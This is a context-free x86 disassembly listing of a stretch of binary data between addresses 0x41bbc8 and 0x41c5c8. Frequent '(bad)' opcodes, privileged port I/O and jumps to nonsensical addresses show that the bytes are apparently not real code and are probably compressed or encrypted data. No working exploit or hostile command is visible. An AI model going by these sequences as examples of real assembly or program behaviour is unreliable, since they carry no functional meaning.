  41bbc8:	pop    esp
  41bbc9:	adc    al,0x95
  41bbcb:	sar    BYTE PTR [eax+ebp*4+0x24],cl
  41bbcf:	sub    DWORD PTR [esi+0x62],esp
  41bbd2:	cmp    ecx,esi
  41bbd4:	push   0x21
  41bbd6:	rol    BYTE PTR [ebx+0x606af1f3],cl
  41bbdc:	or     DWORD PTR [ebx-0xc],edx
  41bbdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbe0:	ja     0x41bb77
  41bbe2:	sahf   
  41bbe3:	pop    ebx
  41bbe4:	xlat   BYTE PTR ds:[ebx]
  41bbe5:	mov    ebp,0x7b078751
  41bbea:	or     BYTE PTR [edi+0x2db780fd],0x25
  41bbf1:	xor    al,0x44
  41bbf3:	(bad)  
  41bbf4:	inc    DWORD PTR [ebx+0x11]
  41bbf7:	xor    BYTE PTR [edi+0x3d],0xa5
  41bbfb:	add    al,0xa1
  41bbfd:	aaa    
  41bbfe:	and    ch,0x3f
  41bc01:	cmp    bl,cl
  41bc03:	inc    DWORD PTR [edi]
  41bc05:	nop
  41bc06:	sub    al,0xa
  41bc08:	fbld   TBYTE PTR [edi]
  41bc0a:	leave  
  41bc0b:	scas   eax,DWORD PTR es:[edi]
  41bc0c:	scas   eax,DWORD PTR es:[edi]
  41bc0d:	les    edx,FWORD PTR [esi+0x696d75f3]
  41bc13:	fwait
  41bc14:	sub    al,0xdd
  41bc16:	xlat   BYTE PTR ds:[ebx]
  41bc17:	cmp    bh,BYTE PTR [ebx+0x21]
  41bc1a:	pop    eax
  41bc1b:	imul   esi,DWORD PTR [ebp-0x52],0x95eec3a
  41bc22:	jl     0x41bc90
  41bc24:	mov    dl,0xe1
  41bc26:	jmp    0xa580:0x280c287f
  41bc2d:	add    ch,BYTE PTR [edi-0x4dfb0689]
  41bc33:	adc    edx,eax
	...
  41bc95:	add    dl,dl
  41bc97:	xor    bh,dl
  41bc99:	clc    
  41bc9a:	cli    
  41bc9b:	clc    
  41bc9c:	sar    BYTE PTR [edx],cl
  41bc9e:	js     0x29ef248d
  41bca4:	mov    al,ds:0x12539fb
  41bca9:	add    BYTE PTR [edi],al
  41bcab:	add    DWORD PTR [eax],eax
  41bcad:	add    al,cl
  41bcaf:	daa    
  41bcb0:	pop    edi
  41bcb1:	pusha  
  41bcb2:	(bad)  
  41bcb3:	jecxz  0x41bca6
  41bcb5:	out    dx,eax
  41bcb6:	inc    eax
  41bcb7:	xchg   ebx,eax
  41bcb8:	jge    0x41bcde
  41bcba:	das    
  41bcbb:	popa   
  41bcbc:	pop    es
  41bcbd:	aas    
  41bcbe:	shl    DWORD PTR [ebx-0x29],1
  41bcc1:	lods   al,BYTE PTR ds:[esi]
  41bcc2:	push   0xffffff9f
  41bcc4:	(bad)  
  41bcc5:	xlat   BYTE PTR ds:[ebx]
  41bcc6:	and    cl,BYTE PTR [esi+ebx*1+0x44]
  41bcca:	ficomp DWORD PTR [esi-0x7ff8cf5e]
  41bcd0:	adc    al,0xbb
  41bcd2:	sbb    eax,0xef444e34
  41bcd7:	pop    edx
  41bcd8:	push   ss
  41bcd9:	sbb    al,0x68
  41bcdb:	jg     0x41bd5b
  41bcdd:	scas   al,BYTE PTR es:[edi]
  41bcde:	scas   eax,DWORD PTR es:[edi]
  41bcdf:	sub    edi,DWORD PTR [edx-0x7c8f1fc1]
  41bce5:	or     edx,DWORD PTR ss:[edx-0x6f]
  41bce9:	fimul  WORD PTR [edi]
  41bceb:	or     bl,bh
  41bced:	loopne 0x41bd64
  41bcef:	aas    
  41bcf0:	fist   DWORD PTR [edi+esi*1]
  41bcf3:	call   0x8d466ce0
  41bcf8:	mov    ch,0x3
  41bcfa:	push   ebp
  41bcfb:	scas   al,BYTE PTR es:[edi]
  41bcfc:	in     al,0xd7
  41bcfe:	mov    es,WORD PTR [bx+si-0x4d]
  41bd02:	sub    eax,0x34d66786
  41bd07:	or     BYTE PTR [edi],ah
  41bd09:	push   esp
  41bd0a:	sub    DWORD PTR [eax+0x4da600f2],esp
  41bd10:	xor    ecx,edi
  41bd12:	imul   edx,DWORD PTR [edi-0x4e38f22c],0x4a06d4b0
  41bd1c:	or     BYTE PTR [ebp+0x24],dl
  41bd1f:	rcr    BYTE PTR [ebp+0xbe235b],1
  41bd25:	jl     0x41bd94
  41bd27:	push   cs
  41bd28:	jmp    0x14d9:0x5d1f8778
  41bd2f:	int    0x62
  41bd31:	cmp    eax,0x56322dc0
  41bd36:	sub    bl,BYTE PTR [edi-0x62f67c9b]
  41bd3c:	mov    dl,0x70
  41bd3e:	dec    edx
  41bd3f:	mov    dh,BYTE PTR [edi+0x48]
  41bd42:	cmp    eax,0x554c00d8
  41bd47:	leave  
  41bd48:	or     al,0xc5
  41bd4a:	jg     0x41bd7f
  41bd4c:	dec    ecx
  41bd4d:	fld    TBYTE PTR [eax]
  41bd4f:	and    cl,dl
  41bd51:	sbb    DWORD PTR [edi+ecx*8],0x505c58d7
  41bd58:	mov    ebx,0xca68d855
  41bd5d:	lock or eax,0x797ce4dc
  41bd63:	imul   eax,eax,0x4f
  41bd66:	pop    esi
  41bd67:	arpl   WORD PTR [esi+0x44b7b091],bx
  41bd6d:	out    dx,eax
  41bd6e:	mov    WORD PTR [ecx-0x19],fs
  41bd71:	pop    ebx
  41bd72:	mov    DWORD PTR [edi],ecx
  41bd74:	and    bl,BYTE PTR [edx+0x53]
  41bd77:	in     eax,0xcb
  41bd79:	jb     0x41bddc
  41bd7b:	jle    0x41bd52
  41bd7d:	add    al,0xc3
  41bd7f:	lods   al,BYTE PTR ds:[esi]
  41bd80:	out    0xdd,eax
  41bd82:	in     eax,dx
  41bd83:	xchg   ecx,eax
  41bd84:	in     eax,dx
  41bd85:	aam    0x31
  41bd87:	add    DWORD PTR [edi-0xba269b1],esp
  41bd8d:	dec    dx
  41bd8f:	xchg   BYTE PTR [eax+0x13],cl
  41bd92:	(bad)  
  41bd94:	pop    ss
  41bd95:	and    DWORD PTR [ecx],ebx
  41bd97:	imul   esp,DWORD PTR [ebp-0x728556e8],0x8efde5dd
  41bda1:	mov    dl,0x19
  41bda3:	push   es
  41bda4:	pop    ebp
  41bda5:	data16 or ch,BYTE PTR [edi-0x7c]
  41bda9:	rcr    BYTE PTR [eax+0x79],1
  41bdac:	aam    0x21
  41bdae:	scas   al,BYTE PTR es:[edi]
  41bdaf:	ds push edi
  41bdb1:	xor    eax,0xe94092
	...
  41be16:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be1c:	imul   edi
  41be1e:	add    BYTE PTR [ebp-0x32],dh
  41be21:	push   edx
  41be22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be23:	ret    
  41be24:	dec    edi
  41be25:	adc    DWORD PTR [eax+0x26],eax
  41be28:	add    DWORD PTR [eax],eax
  41be2a:	pop    es
  41be2b:	add    DWORD PTR [eax],eax
  41be2d:	add    BYTE PTR [ecx+esi*2+0x5cd0c629],al
  41be34:	push   ds
  41be35:	ret    
  41be36:	es mov cl,0xc1
  41be39:	push   edi
  41be3a:	cmp    al,0x43
  41be3c:	sub    eax,0x7edb703f
  41be41:	lahf   
  41be42:	sub    eax,0xf65324e5
  41be47:	jo     0x41bea3
  41be49:	stc    
  41be4a:	clc    
  41be4b:	cdq    
  41be4c:	add    al,0x3e
  41be4e:	inc    esp
  41be4f:	outs   dx,DWORD PTR ds:[esi]
  41be50:	add    dh,BYTE PTR [ecx+0x7b181749]
  41be56:	jbe    0x41be48
  41be58:	mov    dl,0xac
  41be5a:	test   eax,0x697312e6
  41be5f:	push   eax
  41be60:	cmp    BYTE PTR [ebp-0x21],dl
  41be63:	cwde   
  41be64:	cmp    dl,BYTE PTR [esi]
  41be66:	call   0x312:0xf90b5e94
  41be6d:	xor    BYTE PTR [ecx-0x5fa0ec72],dl
  41be73:	icebp  
  41be74:	and    edi,edi
  41be76:	jne    0x41be90
  41be78:	fwait
  41be79:	test   eax,0x3f6e74f8
  41be7e:	in     al,dx
  41be7f:	ret    
  41be80:	inc    eax
  41be81:	pop    es
  41be82:	into   
  41be83:	mov    ecx,0x48195666
  41be88:	test   al,0xf7
  41be8a:	cmp    al,0x9f
  41be8c:	(bad)  
  41be8d:	pop    edx
  41be8e:	mov    ah,0xaf
  41be90:	jmp    0xea4d2d75
  41be95:	retf   
  41be96:	inc    edx
  41be97:	loopne 0x41be96
  41be99:	popa   
  41be9a:	jmp    0x5f1fc035
  41be9f:	sti    
  41bea0:	add    dh,0x3a
  41bea3:	jnp    0x41beca
  41bea5:	jge    0x41bf12
  41bea7:	or     DWORD PTR [edx+edi*4+0x1351abe7],ebx
  41beae:	(bad)  
  41beb0:	mov    esi,0x7173c208
  41beb5:	nop
  41beb6:	push   0x8fdb5cb2
  41bebb:	mov    eax,0x52481a0c
  41bec0:	retf   0x690d
  41bec3:	mov    ebx,DWORD PTR [eax-0x3626cd29]
  41bec9:	pop    ds
  41beca:	fs nop
  41becc:	in     al,0x2a
  41bece:	repnz iret 
  41bed0:	call   0x670b0fbf
  41bed5:	jno    0x41be58
  41bed7:	pop    ds
  41bed8:	xchg   ebx,eax
  41bed9:	jbe    0x41beb5
  41bedb:	test   BYTE PTR [edi+0x7b],dl
  41bede:	pmaxub mm0,QWORD PTR [eax]
  41bee1:	xchg   BYTE PTR [edi-0x69],bh
  41bee4:	jmp    0x18091108
  41bee9:	fistp  WORD PTR [ebp+0x23]
  41beec:	or     al,0xc7
  41beee:	pop    ss
  41beef:	jo     0x41beff
  41bef1:	stc    
  41bef2:	dec    ecx
  41bef3:	aas    
  41bef4:	lahf   
  41bef5:	fnstsw WORD PTR [eax-0x5a]
  41bef8:	mov    ds,WORD PTR ds:0xa271cea0
  41befe:	or     DWORD PTR [edx+0x3efa634],ebx
  41bf04:	repz push 0x1ecbf793
  41bf0a:	mov    esp,0x6247184f
  41bf0f:	or     BYTE PTR [esi+0x6c7be18f],0x84
  41bf16:	iret   
  41bf17:	imul   ecx,DWORD PTR [ecx+0x43],0xb6648f65
  41bf1e:	popa   
  41bf1f:	xchg   bh,ah
  41bf21:	loopne 0x41bf25
  41bf23:	lock arpl bx,sp
  41bf26:	xchg   BYTE PTR [ecx-0x75],ch
  41bf29:	push   ebx
  41bf2a:	jmp    0x41bf69
  41bf2c:	adc    al,0x19
  41bf2e:	push   edi
  41bf2f:	push   ss
  41bf30:	mov    dh,0x7f
  41bf32:	adc    edi,ebx
  41bf34:	mov    DWORD PTR [eax],eax
	...
  41bf96:	fs jae 0x41bfcc
  41bf99:	es aaa 
  41bf9b:	data16 jne 0x41c011
  41bf9e:	pop    ds
  41bf9f:	sub    DWORD PTR [ebx],ebp
  41bfa1:	daa    
  41bfa2:	lds    edi,FWORD PTR [esi]
  41bfa4:	cmp    al,0xce
  41bfa6:	inc    edi
  41bfa7:	daa    
  41bfa8:	add    DWORD PTR [eax],eax
  41bfaa:	pop    es
  41bfab:	add    DWORD PTR [eax],eax
  41bfad:	add    BYTE PTR [ebp+0x6c710759],bl
  41bfb3:	add    ch,bl
  41bfb5:	mov    ch,0x23
  41bfb7:	loop   0x41c02e
  41bfb9:	lock sub dl,al
  41bfbc:	cs popa 
  41bfbe:	loop   0x41bfc7
  41bfc0:	pop    eax
  41bfc1:	inc    esp
  41bfc2:	shl    BYTE PTR [ecx],1
  41bfc4:	popa   
  41bfc5:	outs   dx,DWORD PTR ds:[esi]
  41bfc6:	add    esp,DWORD PTR [eax+0x64b68668]
  41bfcc:	mov    ah,0x8b
  41bfce:	jno    0x41bf70
  41bfd0:	cmp    ch,BYTE PTR [ebx+0xc29968d]
  41bfd6:	sahf   
  41bfd7:	pop    edi
  41bfd8:	outs   dx,DWORD PTR ds:[esi]
  41bfd9:	outs   dx,DWORD PTR ds:[esi]
  41bfda:	jmp    0xa099d6ef
  41bfdf:	xchg   ebp,eax
  41bfe0:	push   edx
  41bfe1:	mov    edx,0x63ac18f4
  41bfe6:	test   al,0x13
  41bfe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfe9:	push   ebp
  41bfea:	cmp    bh,al
  41bfec:	jne    0x41c021
  41bfee:	pop    ebp
  41bfef:	nop
  41bff0:	inc    ebp
  41bff1:	push   edi
  41bff2:	and    al,0xc1
  41bff4:	sub    ecx,DWORD PTR [edi]
  41bff6:	sbb    cl,BYTE PTR [edi-0x41b214a9]
  41bffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bffd:	rcl    dh,0xe0
  41c000:	push   cs
  41c001:	jmp    DWORD PTR [ecx-0x7cd2f092]
  41c007:	jnp    0x41c05a
  41c009:	mov    ebp,0x7b5cbf6d
  41c00e:	or     eax,0x30a4fac4
  41c013:	sbb    al,0x87
  41c015:	push   ebx
  41c016:	adc    al,0xf0
  41c018:	push   esi
  41c019:	mov    al,ds:0xdcb7d735
  41c01e:	mov    ebp,esi
  41c020:	push   ss
  41c021:	cmp    al,0x5b
  41c023:	jle    0x41c018
  41c025:	adc    al,0xc4
  41c027:	push   cs
  41c028:	and    eax,DWORD PTR [ecx]
  41c02a:	inc    esp
  41c02b:	sbb    al,0xcc
  41c02d:	add    BYTE PTR [ecx+ecx*8-0x14d03df],bh
  41c034:	mov    edi,0x43c6e47e
  41c039:	or     al,0xf1
  41c03b:	cdq    
  41c03c:	(bad)  
  41c03d:	sti    
  41c03e:	sub    ch,ah
  41c040:	cmp    esi,DWORD PTR [edx-0x5bda580c]
  41c046:	test   BYTE PTR [eax+ecx*1],cl
  41c049:	dec    eax
  41c04a:	loope  0x41c003
  41c04c:	ins    DWORD PTR es:[edi],dx
  41c04d:	cmp    esi,DWORD PTR [esi]
  41c04f:	lock loopne 0x41bfe7
  41c052:	inc    ebp
  41c053:	imul   ebx,DWORD PTR [eax-0x60],0x5f
  41c057:	add    BYTE PTR [ecx-0x63c1fb64],dh
  41c05d:	pop    esp
  41c05e:	inc    esi
  41c05f:	retf   
  41c060:	cmp    BYTE PTR [ecx-0x3],bh
  41c063:	(bad)  
  41c064:	int3   
  41c065:	inc    esp
  41c066:	xor    BYTE PTR [ebp-0x7b],bh
  41c069:	mov    bl,0x4a
  41c06b:	adc    DWORD PTR [edi],ebp
  41c06d:	xlat   BYTE PTR ds:[ebx]
  41c06e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41c070:	xchg   DWORD PTR [esi-0x4cb7e9ab],ecx
  41c076:	and    cl,dh
  41c078:	and    DWORD PTR [eax+eiz*4],esi
  41c07b:	(bad)  
  41c07c:	jnp    0x41c0a5
  41c07e:	sbb    BYTE PTR [edi+0xd],bl
  41c081:	lods   al,BYTE PTR gs:[esi]
  41c083:	sbb    BYTE PTR [ebx],al
  41c085:	aam    0xce
  41c087:	mov    al,ds:0xb0963b8f
  41c08c:	(bad)  
  41c08d:	out    0x15,al
  41c08f:	and    eax,ecx
  41c091:	xchg   ah,cl
  41c093:	adc    ebx,ebx
  41c095:	sbb    esp,DWORD PTR [eax+0xf]
  41c098:	pop    edi
  41c099:	sbb    bl,bh
  41c09b:	cld    
  41c09c:	sbb    BYTE PTR [ebx-0x1332067d],dh
  41c0a2:	test   al,0xf2
  41c0a4:	fidivr WORD PTR [edi-0x6a]
  41c0a7:	std    
  41c0a8:	mov    ecx,0x30db9981
  41c0ad:	mov    edi,DWORD PTR [ecx-0x48]
  41c0b0:	imul   cl
  41c0b2:	jbe    0x41c12c
  41c0b4:	sbb    DWORD PTR [eax],eax
	...
  41c116:	(bad)  [edx-0x5f]
  41c119:	clc    
  41c11a:	mov    bl,0xfb
  41c11c:	fldcw  WORD PTR [ebx+0x49]
  41c11f:	xlat   BYTE PTR ds:[ebx]
  41c120:	mov    ebp,0xb96da2f8
  41c125:	dec    esi
  41c126:	dec    esi
  41c127:	sub    BYTE PTR [ecx],al
  41c129:	add    BYTE PTR [edi],al
  41c12b:	add    DWORD PTR [eax],eax
  41c12d:	add    BYTE PTR [ecx-0x2fd3de9f],dl
  41c133:	sbb    dl,al
  41c135:	push   ds
  41c136:	push   edx
  41c137:	pop    eax
  41c138:	inc    esp
  41c139:	xchg   ecx,eax
  41c13a:	or     BYTE PTR [eax-0x31e518eb],0xed
  41c141:	mov    eax,0x40b9c707
  41c146:	cli    
  41c147:	sti    
  41c148:	xchg   ebp,eax
  41c149:	les    ebx,FWORD PTR [ebx]
  41c14b:	mov    eax,0x2f7635bb
  41c150:	and    edx,DWORD PTR [ebx-0x4]
  41c153:	fwait
  41c154:	aas    
  41c155:	retf   0x797b
  41c158:	cmp    BYTE PTR [esi-0x5ffdc133],dl
  41c15e:	iret   
  41c15f:	scas   al,BYTE PTR es:[edi]
  41c160:	cmovl  ecx,DWORD PTR [edx-0x60]
  41c164:	test   eax,0x6ea3924d
  41c169:	jmp    0xc2561fca
  41c16e:	xchg   ecx,eax
  41c16f:	mov    ecx,0xc17611b5
  41c174:	xor    DWORD PTR [ecx-0x2070b3c],edx
  41c17a:	jecxz  0x41c16c
  41c17c:	xchg   DWORD PTR [edx+0x734b0fe2],edi
  41c182:	cli    
  41c183:	xchg   edi,eax
  41c184:	test   al,0xcc
  41c186:	dec    ebp
  41c187:	shr    BYTE PTR [edx+0x43],1
  41c18a:	and    al,BYTE PTR [ebx-0x67d54601]
  41c190:	xchg   esi,eax
  41c191:	mov    eax,0x50ceb868
  41c196:	dec    ebp
  41c197:	es icebp 
  41c199:	adc    al,BYTE PTR [esi-0xa]
  41c19c:	dec    ebx
  41c19d:	lea    edi,[eax]
  41c19f:	sar    edi,0x83
  41c1a2:	cmp    eax,0x61467e30
  41c1a7:	sbb    DWORD PTR [edi-0x1f],edx
  41c1aa:	lods   al,BYTE PTR ds:[esi]
  41c1ab:	icebp  
  41c1ac:	adc    ebx,DWORD PTR [ebp-0x58]
  41c1af:	leave  
  41c1b0:	xor    eax,0x2ad87a36
  41c1b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1b6:	mov    dl,0x87
  41c1b8:	lea    ebp,[eax+esi*1-0x4901f454]
  41c1bf:	mov    ecx,0xcd09ae8c
  41c1c4:	mov    DWORD PTR ss:[esi-0x30],edx
  41c1c8:	gs in  al,0x3f
  41c1cb:	mov    esi,edi
  41c1cd:	aad    0x2
  41c1cf:	adc    BYTE PTR [edi-0x5a],bh
  41c1d2:	mul    BYTE PTR [eax-0x6e]
  41c1d5:	mov    al,ds:0x52efb26c
  41c1da:	lock pushf 
  41c1dc:	cmp    BYTE PTR [ecx+eax*8],ch
  41c1df:	lock ror BYTE PTR [ecx+ebx*1-0x71],1
  41c1e4:	(bad)  
  41c1e5:	aad    0x20
  41c1e7:	mov    fs,WORD PTR [eax-0x17657de7]
  41c1ed:	push   esi
  41c1ee:	jno    0x41c1eb
  41c1f0:	adc    BYTE PTR [eax],cl
  41c1f2:	pop    esp
  41c1f3:	iret   
  41c1f4:	dec    edi
  41c1f5:	xchg   BYTE PTR [edx-0x50],al
  41c1f8:	sub    BYTE PTR [ebp+0x64],ch
  41c1fb:	pop    ebx
  41c1fc:	cmc    
  41c1fd:	cmp    dl,BYTE PTR ds:0x20b78f37
  41c203:	mov    edi,DWORD PTR [ecx+0x7d98703f]
  41c209:	mov    cs,ecx
  41c20b:	dec    edi
  41c20c:	inc    esi
  41c20d:	sub    DWORD PTR [esi],ecx
  41c20f:	ss pop esp
  41c211:	addr16 retf 0x297c
  41c215:	sub    esp,ecx
  41c217:	arpl   si,cx
  41c219:	jbe    0x41c20d
  41c21b:	(bad)  
  41c21c:	sub    ebp,DWORD PTR [ebp-0xfaa6729]
  41c222:	fdiv   DWORD PTR [ecx-0xe]
  41c225:	xor    ebp,esp
  41c227:	cs cli 
  41c229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c22a:	ja     0x41c1d1
  41c22c:	std    
  41c22d:	mov    ah,0xe7
  41c22f:	inc    ecx
  41c230:	ret    
  41c231:	cmc    
  41c232:	or     BYTE PTR [esi+0xbf],al
	...
  41c294:	add    BYTE PTR [eax],al
  41c296:	repz and ebp,ecx
  41c299:	push   ebp
  41c29a:	(bad)  
  41c29c:	sti    
  41c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c29e:	push   esp
  41c29f:	mov    WORD PTR [edi+0x3f],?
  41c2a2:	fdivrp st(3),st
  41c2a4:	in     eax,dx
  41c2a5:	and    BYTE PTR [ebp+0x29],dl
  41c2a8:	add    DWORD PTR [eax],eax
  41c2aa:	pop    es
  41c2ab:	add    DWORD PTR [eax],eax
  41c2ad:	add    BYTE PTR [edx],ch
  41c2af:	mov    eax,ds:0x7e45bbe6
  41c2b4:	jo     0x41c27d
  41c2b6:	sub    al,0x79
  41c2b8:	jecxz  0x41c335
  41c2ba:	push   esp
  41c2bb:	push   edi
  41c2bc:	cmp    ecx,DWORD PTR [esi-0x75aad20]
  41c2c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2c3:	add    BYTE PTR [ecx+0x5c3cef52],bl
  41c2c9:	sbb    ah,dl
  41c2cb:	lods   al,BYTE PTR ds:[esi]
  41c2cc:	fucom  st(1)
  41c2ce:	jp     0x41c2b7
  41c2d0:	jmp    0x2db3:0x44d6200a
  41c2d7:	aad    0xe0
  41c2d9:	pop    es
  41c2da:	nop
  41c2db:	xchg   esp,eax
  41c2dc:	inc    ebp
  41c2dd:	call   0xd453ea9a
  41c2e2:	push   ds
  41c2e3:	jge    0x41c308
  41c2e5:	jne    0x41c316
  41c2e7:	jnp    0x41c274
  41c2e9:	or     ebx,edx
  41c2eb:	jp     0x41c2bb
  41c2ed:	mov    al,ds:0xafe57eb9
  41c2f2:	imul   DWORD PTR [esi+0x2d]
  41c2f5:	add    al,0xd8
  41c2f7:	les    ecx,FWORD PTR [ebx+0x257b158e]
  41c2fd:	jne    0x41c2bf
  41c2ff:	ret    
  41c300:	sbb    dl,al
  41c302:	xor    dh,BYTE PTR [ebp-0x60]
  41c305:	xor    edx,ebp
  41c307:	sub    al,0xfd
  41c309:	loope  0x41c29f
  41c30b:	push   ebx
  41c30c:	mov    bh,0x84
  41c30e:	(bad)  
  41c310:	in     al,0xab
  41c312:	call   DWORD PTR [edi]
  41c314:	ja     0x41c36a
  41c316:	and    edi,edi
  41c318:	lock mov edx,0xb0e47a5b
  41c31e:	push   cs
  41c31f:	add    bh,BYTE PTR [eax+0x25642882]
  41c325:	pop    ss
  41c326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c327:	loopne 0x41c2c1
  41c329:	xchg   edx,eax
  41c32a:	and    eax,0x8072d3d2
  41c32f:	dec    esi
  41c330:	retf   0xbd28
  41c333:	sub    eax,0x34c1663
  41c338:	jle    0x41c301
  41c33a:	gs aaa 
  41c33c:	sub    eax,0x973de41e
  41c341:	mov    esp,0x7cfc4a80
  41c346:	xchg   edx,eax
  41c347:	push   ds
  41c348:	mov    ch,0xd9
  41c34a:	pop    ss
  41c34b:	inc    esp
  41c34c:	js     0x41c39a
  41c34e:	call   0x570f4bcf
  41c353:	cmp    ah,al
  41c355:	push   eax
  41c356:	xchg   edx,eax
  41c357:	sbb    DWORD PTR [edx+0x4f],0xffffffa2
  41c35b:	sbb    eax,0x355edb95
  41c360:	sub    BYTE PTR [edi-0x41],0x1
  41c364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c365:	test   dl,0xf4
  41c368:	aam    0x74
  41c36a:	(bad)  
  41c36c:	or     al,0x8d
  41c36e:	out    0x34,eax
  41c370:	std    
  41c371:	retf   
  41c372:	mov    ebp,DWORD PTR [ebx+edx*2+0x34]
  41c376:	cmova  esi,DWORD PTR [edx-0x4d]
  41c37a:	sub    ebx,ebp
  41c37c:	adc    eax,0x8293b9fc
  41c381:	jnp    0x41c31a
  41c383:	jae    0x41c3be
  41c385:	dec    eax
  41c386:	test   al,0x3a
  41c388:	mov    ds:0xa756d764,al
  41c38d:	sti    
  41c38e:	jl     0x41c31f
  41c390:	mov    edi,0xad03ef0a
  41c395:	les    eax,FWORD PTR [bp+si+0x7b]
  41c399:	xchg   ebp,eax
  41c39a:	int3   
  41c39b:	mov    dl,ch
  41c39d:	idiv   BYTE PTR [edx+edx*1]
  41c3a0:	stos   BYTE PTR es:[edi],al
  41c3a1:	out    dx,eax
  41c3a2:	ins    DWORD PTR es:[edi],dx
  41c3a3:	mov    edi,0xe4341281
  41c3a8:	inc    esp
  41c3a9:	ja     0x41c3e6
  41c3ab:	pop    es
  41c3ac:	repz test eax,0x77944e3d
  41c3b2:	add    DWORD PTR [edx+0x3c],eax
	...
  41c415:	add    BYTE PTR [ebx+0x20],dl
  41c418:	mov    al,ds:0x5faef3ae
  41c41d:	std    
  41c41e:	mov    ah,0x86
  41c420:	jmp    FWORD PTR [eax+edi*1-0x6c]
  41c424:	fnstsw WORD PTR ds:0x12a5c
  41c42a:	pop    es
  41c42b:	add    DWORD PTR [eax],eax
  41c42d:	add    BYTE PTR [esi+0x56],cl
  41c430:	stos   BYTE PTR es:[edi],al
  41c431:	gs test eax,0xd7759ca0
  41c437:	call   0x443a7966
  41c43c:	and    eax,edi
  41c43e:	(bad)  
  41c43f:	lods   eax,DWORD PTR ds:[esi]
  41c440:	mov    edi,0xc707a6b1
  41c445:	(bad)  
  41c446:	adc    DWORD PTR [esi+0x75],eax
  41c449:	and    ax,0x768
  41c44d:	and    eax,0x7b49e3e1
  41c452:	or     ebp,DWORD PTR [edx+0x5f]
  41c455:	mov    ch,0x14
  41c457:	in     al,dx
  41c458:	dec    eax
  41c459:	scas   al,BYTE PTR es:[edi]
  41c45a:	lea    ebx,[ebx+0x4e247c0c]
  41c460:	adc    eax,0x1051149c
  41c465:	stos   DWORD PTR es:[edi],eax
  41c466:	sub    ecx,DWORD PTR ds:[edi]
  41c469:	stc    
  41c46a:	jecxz  0x41c435
  41c46c:	repnz nop
  41c46e:	lock das 
  41c470:	cmp    edx,edi
  41c472:	and    DWORD PTR [ecx+0x59],esp
  41c475:	es dec ebp
  41c477:	clc    
  41c478:	cdq    
  41c479:	lahf   
  41c47a:	ret    
  41c47b:	fmul   DWORD PTR [ebx]
  41c47d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c47e:	jle    0x41c4cc
  41c480:	cmp    al,0xd0
  41c482:	pslld  mm1,mm7
  41c485:	mov    ebx,esi
  41c487:	scas   al,BYTE PTR es:[edi]
  41c488:	dec    edi
  41c489:	fwait
  41c48a:	jmp    0x210c:0x62f99a3
  41c491:	mov    ah,BYTE PTR cs:[ebp+0x17]
  41c495:	push   edx
  41c496:	int3   
  41c497:	ret    
  41c498:	mov    bl,0xb5
  41c49a:	jge    0x41c48b
  41c49c:	push   cs
  41c49d:	or     eax,0x2466dea6
  41c4a2:	out    0xa4,eax
  41c4a4:	neg    DWORD PTR [edx+edx*4+0xd]
  41c4a8:	mov    esp,0x4058ef83
  41c4ad:	dec    ebx
  41c4ae:	scas   eax,DWORD PTR es:[edi]
  41c4af:	out    dx,al
  41c4b0:	repz inc esp
  41c4b2:	jmp    0x4e1b644c
  41c4b7:	mov    al,ds:0x245002ae
  41c4bc:	iret   
  41c4bd:	xor    ebp,DWORD PTR [edi-0x76]
  41c4c0:	push   0x26d405a8
  41c4c5:	adc    DWORD PTR [ebx+0x5d8bd65f],esi
  41c4cb:	jecxz  0x41c50c
  41c4cd:	push   ebx
  41c4ce:	sub    cl,BYTE PTR [edx-0x19]
  41c4d1:	pop    ecx
  41c4d2:	(bad)  
  41c4d3:	fisubr WORD PTR [edi-0x7484c0ee]
  41c4d9:	js     0x41c48a
  41c4db:	mov    ecx,0xd764b20a
  41c4e0:	bound  esp,QWORD PTR [edi+eax*4+0x5a851bb3]
  41c4e7:	sbb    DWORD PTR [edx],edx
  41c4e9:	(bad)  
  41c4eb:	jno    0x41c480
  41c4ed:	retf   0x2197
  41c4f0:	aam    0xd2
  41c4f2:	mov    ch,0xb5
  41c4f4:	(bad)  
  41c4f5:	xchg   ebp,eax
  41c4f6:	test   al,0xa8
  41c4f8:	fadd   QWORD PTR [ebx-0x123807aa]
  41c4fe:	hlt    
  41c4ff:	dec    ebp
  41c500:	push   es
  41c501:	xchg   esi,eax
  41c502:	(bad)  
  41c503:	xor    eax,0x50fb6ff0
  41c508:	bound  edx,QWORD PTR [ecx+0x279f0883]
  41c50e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c50f:	pop    eax
  41c510:	sub    DWORD PTR [esi],ebx
  41c512:	data16 and ch,bl
  41c515:	pop    ds
  41c516:	inc    eax
  41c517:	adc    al,0xa7
  41c519:	int    0x49
  41c51b:	xchg   ebp,eax
  41c51c:	mov    dl,0x53
  41c51e:	ret    
  41c51f:	imul   edi,DWORD PTR [ecx-0x67ff810c],0xffffffd4
  41c526:	inc    edi
  41c527:	cs adc eax,0x7bbe4ebe
  41c52d:	gs push es
  41c52f:	mov    ah,0x85
  41c531:	adc    eax,0xa71266
	...
  41c596:	lds    esp,FWORD PTR [ebx]
  41c598:	xchg   ecx,eax
  41c599:	and    eax,0xe3f5b7f7
  41c59e:	sbb    ch,BYTE PTR [edx+0x10]
  41c5a1:	stc    
  41c5a2:	xchg   DWORD PTR [esp+0x12b634f],eax
  41c5a9:	add    BYTE PTR [edi],al
  41c5ab:	add    DWORD PTR [eax],eax
  41c5ad:	add    BYTE PTR [ebx+0x2b],ah
  41c5b0:	push   0x3b6ecd2d
  41c5b5:	aam    0x52
  41c5b7:	fdivp  st(5),st
  41c5b9:	inc    edi
  41c5ba:	and    al,0x10
  41c5bc:	ss imul edx,esp,0x2e61763e
  41c5c3:	repnz popf 
  41c5c5:	out    0x3c,eax
  41c5c7:	popf   
  41c5c8:	xchg   ecx,eax
